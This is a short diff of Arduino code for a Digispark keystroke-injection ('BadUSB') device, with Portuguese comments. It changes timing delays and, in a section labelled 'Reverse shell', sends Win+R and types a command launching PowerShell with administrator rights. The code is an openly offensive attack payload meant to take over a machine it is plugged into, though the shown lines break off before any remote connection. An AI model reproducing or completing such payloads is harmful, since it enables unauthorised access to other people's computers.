@@ -41,10 +41,8 @@ pisca_led(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(2000);
   //Reverse shell
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("powershell start-process powershell -verb runas");
